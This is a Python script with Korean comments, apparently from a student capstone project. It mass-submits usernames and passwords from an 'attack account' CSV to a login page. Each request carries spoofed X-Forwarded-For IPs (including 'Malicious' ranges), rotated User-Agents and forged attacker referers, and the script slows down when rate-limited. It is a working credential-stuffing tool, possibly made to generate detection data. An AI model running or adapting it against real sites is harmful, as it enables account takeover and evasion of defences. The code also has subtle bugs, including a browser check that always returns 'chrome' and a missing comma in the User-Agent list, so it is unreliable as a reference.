import pandas as pd
import random
import requests
import time
from urllib.parse import urlparse

# 1-1. 실제 로그인 "처리" URL (폼이 제출되는 action URL)
LOGIN_URL = "https://capstone3d.dothome.co.kr/login.php"  # (예시)

# 1-2. 로그인 폼 <input>의 'name' 속성 (HTML 소스 보기로 확인)
ID_FIELD_NAME = "userid"  # (예시)
PW_FIELD_NAME = "password"  # (예시)

# 1-3. 공격용 계정 파일
ACCOUNTS_FILE = "사용자계정/사용자계정2/success_accounts2.csv"
# ------------------------------


# --- 2. 헤더 생성용 데이터셋 ---

# User-Agent, Accept 헤더
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',

    'Mozilla/5.0 (Linux; Android 14; SM-S918N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S918N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',

    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',

    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15'

    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',

    'python-requests/2.31.0',
    'curl/8.0.1',
    'Nmap Scripting Engine'
]
ACCEPT_HEADERS_BY_BROWSER = {
    'chrome': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'firefox': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'safari': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'none': None
}

# --- 지역별 IP 및 언어 설정 (악성 IP 카테고리 추가) ---
LOCATION_DATA = {
    'Korea': {
        'ip_prefixes': ['118.34', '211.178', '175.209', '59.15', '220.76',
                        '118.35', '211.179', '175.210', '59.16', '220.77'],
        'languages': ['ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9', 'ko']
    },
    'USA': {
        'ip_prefixes': ['104.16', '172.217', '69.171', '23.200', '192.0',
                        '104.17', '172.218', '69.172', '23.201', '192.1'],
        'languages': ['en-US,en;q=0.9', 'en-US,en;q=0.9,es;q=0.8']
    },
    'China': {
        'ip_prefixes': ['120.240', '112.96', '183.232', '223.104',
                        '120.241', '112.97', '183.233', '223.105'],
        'languages': ['zh-CN,zh;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9']
    },
    'Europe': {
        'ip_prefixes': ['92.122', '185.228', '89.187', '77.222', '193.106',
                        '92.123', '185.229', '89.188', '77.223', '193.107'],
        'languages': ['en-GB,en;q=0.9,de;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8']
    },
    'Malicious': {
        'ip_prefixes': [
            '5.188',  # 러시아/유럽 데이터 센터
            '45.9',  # 알려진 VPN/아노니마이저 대역
            '185.220',  # 알려진 VPN/아노니마이저 대역
            '198.50',  # 데이터 센터 (OVH)
            '162.243',  # 데이터 센터 (DigitalOcean)
            '34.200',  # 데이터 센터 (AWS)
            '172.104',  # 데이터 센터 (Linode)
            '91.241',  # 알려진 봇넷/스캐너 대역
            '192.241',  # 데이터 센터 (DigitalOcean)
            '64.225'  # 데이터 센터 (DigitalOcean)
        ],
        'languages': ['en-US,en;q=0.9', 'en-US', '']  # 봇은 Language 헤더가 없거나('') 단순함
    }
}
# ----------------------------------------------------------

# locations 리스트와 weights 가중치
locations = ['Korea', 'USA', 'China', 'Europe', 'Malicious']
weights = [60, 15, 10, 5, 10]  # (Korea 60%, USA 15%, China 10%, Europe 5%, Malicious 10% = 합 100%)

# "정상" 사용자 도메인 기준
NORMAL_REFERERS = [
    'https://capstone3d.dothome.co.kr/',
    'https://capstone3d.dothome.co.kr/main.php',
    'https://capstone3d.dothome.co.kr/login.php',
    'none'
]
NORMAL_SEC_FETCH_SETS = [
    {'site': 'same-origin', 'mode': 'navigate', 'user': '?1', 'dest': 'document'},
    {'site': 'same-origin', 'mode': 'cors', 'user': '?1', 'dest': 'empty'},
    {'site': None, 'mode': None, 'user': None, 'dest': None}

]

# "비정상/외부" 시나리오
ATTACK_REFERERS = [
    'https://www.google.com/',
    'http://attacker-site.xyz/login-attack.html',
    'https://capstone3d.dothome.net/fake-login.php',
    None  # Referer 헤더 없음
]
ATTACK_SEC_FETCH_SETS = [
    {'site': 'cross-site', 'mode': 'navigate', 'user': '?1', 'dest': 'document'},
    {'site': 'none', 'mode': 'no-cors', 'user': None, 'dest': 'empty'}  # Sec-Fetch 없는 봇
]


# --- 3. 헤더 생성 헬퍼 함수 ---

def get_browser_type_from_ua(ua_string):
    ua_lower = ua_string.lower()

    if 'Firefox/' in ua_lower:
        return 'firefox'
    elif 'Chrome/' in ua_lower:
        return 'chrome'
    elif 'Safari/' in ua_lower and 'version/' in ua_lower:
        return 'safari'
    else:
        return 'chrome'


def get_origin_from_referer(referer_url):
    """Referer URL을 받아 Origin 헤더 값을 반환합니다."""
    if referer_url is None:
        return random.choice([None, 'null'])
    try:
        parsed = urlparse(referer_url)
        return f"{parsed.scheme}://{parsed.netloc}"
    except:
        return None


# --- 4. 메인 스크립트 실행 (기존과 동일) ---

try:
    df = pd.read_csv(ACCOUNTS_FILE)
    total_accounts = len(df)
    print(f"'{ACCOUNTS_FILE}'에서 {total_accounts}개의 계정을 로드했습니다.")
    print(f"타겟 URL: {LOGIN_URL}")
    print(f"ID 필드: '{ID_FIELD_NAME}', PW 필드: '{PW_FIELD_NAME}'")
    print("--- 3초 후 로그인 시뮬레이션을 시작합니다 ---")
    time.sleep(3)

    for index, row in df.iterrows():
        # (파일의 열 이름이 'userid', 'password'가 아니면 이 부분을 수정)
        userid = row['userid']
        password = row['password']

        # 1. 로그인 페이로드(폼 데이터) 생성
        payload = {
            "loginId": userid,
            "password": password
        }

        # 2. 전송할 헤더 (실시간 랜덤 생성)
        headers_to_send = {}

        # 2-1. (수정) IP, Language: 가중치에 따라 'Malicious' 포함 랜덤 선택
        chosen_location = random.choices(locations, weights=weights, k=1)[0]
        location_info = LOCATION_DATA[chosen_location]
        prefix = random.choice(location_info['ip_prefixes'])
        ip_address = f"{prefix}.{random.randint(1, 254)}.{random.randint(1, 254)}"

        headers_to_send['X-Forwarded-For'] = ip_address
        headers_to_send['Accept-Language'] = random.choice(location_info['languages'])

        # 2-2. User-Agent 및 Accept
        ua = random.choice(USER_AGENTS)
        browser_type = get_browser_type_from_ua(ua)
        headers_to_send['User-Agent'] = ua
        headers_to_send['Accept'] = ACCEPT_HEADERS_BY_BROWSER[browser_type]

        # 2-3. Referer, Origin, Sec-Fetch (80% 정상, 20% 비정상)
        if random.random() < 0.8:
            sec_set = random.choice(NORMAL_SEC_FETCH_SETS)
            referer = random.choice(NORMAL_REFERERS)
        else:
            sec_set = random.choice(ATTACK_SEC_FETCH_SETS)
            referer = random.choice(ATTACK_REFERERS)

        origin = get_origin_from_referer(referer)

        if referer: headers_to_send['Referer'] = referer
        if origin: headers_to_send['Origin'] = origin

        headers_to_send['Sec-Fetch-Site'] = sec_set['site']
        headers_to_send['Sec-Fetch-Mode'] = sec_set['mode']
        if sec_set['user']: headers_to_send['Sec-Fetch-User'] = sec_set['user']
        headers_to_send['Sec-Fetch-Dest'] = sec_set['dest']

        # 3. HTTP POST 요청 발송
        try:
            response = requests.post(LOGIN_URL, headers=headers_to_send, data=payload, timeout=5)

            # (수정) IP의 출처(chosen_location)를 함께 로깅
            print(
                f"[{index + 1}/{total_accounts}] User: {userid:<15} | IP: {ip_address:<18} | Type: {chosen_location:<9} | Status: {response.status_code}")

            if response.status_code in [403, 429]:
                print(f"차단 또는 속도 제한 응답({response.status_code}) 감지! 5초간 대기합니다...")
                time.sleep(5)

        except requests.exceptions.RequestException as e:
            print(f"[{index + 1}/{total_accounts}] User: {userid:<15} |  Error: {e}")

        # 4. 다음 요청 전 잠시 대기
        time.sleep(random.uniform(0.1, 0.5))

    print("--- 모든 계정 시뮬레이션 완료 ---")

except FileNotFoundError:
    print(f" 오류: 계정 파일('{ACCOUNTS_FILE}')을 찾을 수 없습니다.")
except KeyError as e:
    print(f"오류: CSV 파일에서 '{e}' 열을 찾을 수 없습니다.")
    print("CSV 파일에 'userid', 'password' 열이 있는지 확인해주세요.")
except Exception as e:
    print(f"알 수 없는 오류가 발생했습니다: {e}")